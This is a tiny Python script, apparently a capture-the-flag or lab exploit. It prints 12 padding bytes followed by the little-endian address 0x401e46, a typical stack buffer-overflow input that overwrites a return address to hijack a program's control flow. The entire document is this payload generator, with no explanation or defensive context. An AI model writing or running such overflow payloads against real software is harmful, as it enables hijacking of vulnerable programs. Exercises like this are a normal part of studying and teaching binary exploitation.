#!/usr/bin/env python3

import sys

sys.stdout.buffer.write(b'\x00'*12 + 0x401e46.to_bytes(8, 'little'))